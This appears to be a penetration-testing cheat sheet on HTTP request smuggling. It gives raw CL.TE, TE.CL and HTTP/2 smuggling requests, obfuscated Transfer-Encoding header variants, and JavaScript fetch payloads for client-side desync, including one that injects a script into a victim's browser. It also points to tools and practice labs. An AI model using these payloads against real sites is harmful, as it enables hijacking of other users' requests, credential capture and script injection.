# request smuggling

> http request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. this disagreement can be used to interfere with another user's request/response or to bypass security controls. it normally occurs due to prioritising different http headers (content-length vs transfer-encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.


## summary

* [tools](#tools)
* [methodology](#methodology)
    * [cl.te vulnerabilities](#cl.te-vulnerabilities)
    * [te.cl vulnerabilities](#te.cl-vulnerabilities)
    * [te.te vulnerabilities](#tete-vulnerabilities)
    * [http/2 request smuggling](#http2-request-smuggling)
    * [client-side desync](#client-side-desync)
* [labs](#labs)
* [references](#references)


## tools

* [bappstore/http request smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - an extension for burp suite designed to help you launch http request smuggling attacks
* [defparam/smuggler](https://github.com/defparam/smuggler) - an http request smuggling / desync testing tool written in python 3
* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - this tool is developed for burp suite practitioner certificate exam and http request smuggling labs.


## methodology

if you want to exploit http requests smuggling manually you will face some problems especially in te.cl vulnerability you have to calculate the chunk size for the second request(malicious request) as portswigger suggests `manually fixing the length fields in request smuggling attacks can be tricky.`.


### cl.te vulnerabilities

> the front-end server uses the content-length header and the back-end server uses the transfer-encoding header.

```powershell
post / http/1.1
host: vulnerable-website.com
content-length: 13
transfer-encoding: chunked

0

smuggled
```

example:

```powershell
post / http/1.1
host: domain.example.com
connection: keep-alive
content-type: application/x-www-form-urlencoded
content-length: 6
transfer-encoding: chunked

0

g
```


### te.cl vulnerabilities

> the front-end server uses the transfer-encoding header and the back-end server uses the content-length header. 

```powershell
post / http/1.1
host: vulnerable-website.com
content-length: 3
transfer-encoding: chunked

8
smuggled
0
```

example:

```powershell
post / http/1.1
host: domain.example.com
user-agent: mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/73.0.3683.86
content-length: 4
connection: close
content-type: application/x-www-form-urlencoded
accept-encoding: gzip, deflate

5c
gpost / http/1.1
content-type: application/x-www-form-urlencoded
content-length: 15
x=1
0


```

:warning: to send this request using burp repeater, you will first need to go to the repeater menu and ensure that the "update content-length" option is unchecked.you need to include the trailing sequence `\r\n\r\n` following the final 0.


### te.te vulnerabilities

> the front-end and back-end servers both support the transfer-encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```powershell
transfer-encoding: xchunked
transfer-encoding : chunked
transfer-encoding: chunked
transfer-encoding: x
transfer-encoding:[tab]chunked
[space]transfer-encoding: chunked
x: x[\n]transfer-encoding: chunked
transfer-encoding
: chunked
```


## http/2 request smuggling

http/2 request smuggling can occur if a machine converts your http/2 request to http/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (crlf) into the translated request. http/2 request smuggling can also occur in a get request, if you can hide an http/1.1 request inside an http/2 header

```
:method get
:path /
:authority www.example.com
header ignored\r\n\r\nget / http/1.1\r\nhost: www.example.com
```


## client-side desync

on some paths, servers don't expect post requests, and will treat them as simple get requests, ignoring the payload, eg:

```
post / http/1.1
host: www.example.com
content-length: 37

get / http/1.1
host: www.example.com
```

could be treated as two requests when it should only be one. when the backend server responds twice, the frontend server will assume only the first response is related to this request.

to exploit this, an attacker can use javascript to trigger their victim to send a post to the vulnerable site:

```javascript
fetch('https://www.example.com/', {method: 'post', body: "get / http/1.1\r\nhost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

this could be used to:

* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
* to get the victim to run arbitrary javascript as if it were from the site

**example**:

```javascript
fetch('https://www.example.com/redirect', {
    method: 'post',
        body: `head /404/ http/1.1\r\nhost: www.example.com\r\n\r\nget /x?x=<script>alert(1)</script> http/1.1\r\nx: y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'https://www.example.com/'
})
```

this script tells the victim browser to send a `post` request to `www.example.com/redirect`. that returns a redirect which is blocked by cors, and causes the browser to execute the catch block, by going to `www.example.com`. 

www.example.com now incorrectly processes the `head` request in the `post`'s body, instead of the browser's `get` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`get /x?x=<script>...`) request and finally the browser's actual `get` request.
since the browser only sent one request, it accepts the response to the `head` request as the response to its `get` request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.


## labs

* [portswigger - http request smuggling, basic cl.te vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
* [portswigger - http request smuggling, basic te.cl vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
* [portswigger - http request smuggling, obfuscating the te header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
* [portswigger - response queue poisoning via h2.te request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
* [portswigger - client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)


## references

- [a pentester's guide to http request smuggling - busra demir - october 16, 2020](https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
- [advanced request smuggling - portswigger - october 26, 2021](https://portswigger.net/web-security/request-smuggling/advanced#http-2-request-smuggling)
- [browser-powered desync attacks: a new frontier in http request smuggling - james kettle (@albinowax) - august 10, 2022](https://portswigger.net/research/browser-powered-desync-attacks)
- [http desync attacks: request smuggling reborn - james kettle (@albinowax) - august 7, 2019](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [request smuggling tutorial - portswigger - september 28, 2019](https://portswigger.net/web-security/request-smuggling)